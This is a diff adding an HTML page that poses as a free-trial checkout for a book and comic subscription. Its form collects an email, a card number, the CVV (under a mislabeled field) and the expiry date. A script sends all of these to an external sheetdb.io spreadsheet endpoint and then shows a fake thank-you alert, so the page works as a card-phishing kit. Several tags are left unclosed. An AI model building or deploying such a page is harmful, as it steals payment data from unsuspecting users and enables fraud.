@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - Credit Card Checkout</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!------ Copyright ------
+Designed by: Emily Feng
+Dribbble: https://dribbble.com/emilyfeng
+Developed by Yago Rocha for educational purpose
+-->
+
+<main id='container'>
+        <aside id='info'
+        <form action="https://sheetdb.io/api/v1/q1tjsdo27vawe" id="sheetdb-form" method="POST"
+        
+        <label for='paymentMethod'>Email</label>
+            <input type="text" name="data[email]" required placeholder="your@mail.com"
+
+            <!-- Credit Card Number -->
+            <label for='cardNumber'>Credit Card Number</label>
+            <input type='number' name='data[cardNumber]' required placeholder="1234567890123456"/>
+
+            <!-- Credit Card Holder Name -->
+            <label for='cardholderName'>CVV</label>
+            <input type='number' name='data[cardholderName]' required placeholder="cvv" />
+
+            <!-- Expiration Date -->
+            <label for='cardDate'>Expiration Date</label>
+            <input type="date" name='data[cardDate]' required placeholder="5"
+          
+
+           
+
+            <button id= 'makePayment'>try for free 3 month</button>
+        </aside>
+        <aside id='description'>
+          <h2>Access our all books and comic for free</h2>
+          <h3>After free trial our subscription is $1 per month </h3>
+          <img src='/20220719_200008_0000-removebg-preview.png' >
+          <h1>$0.00</h1>
+          <button id='editOrder'>Read our all books for free</button>
+          </form>
+        </aside>
+    </main>
+<!-- partial -->
+
+  <script>
+    var form = document.getElementById('sheetdb-form');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+      }).then(
+        response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        alert('Thank you for subscribing, you will receive mail soon.  Wait a bit')
+      });
+    });
+  </script>
+</body>
+</html>
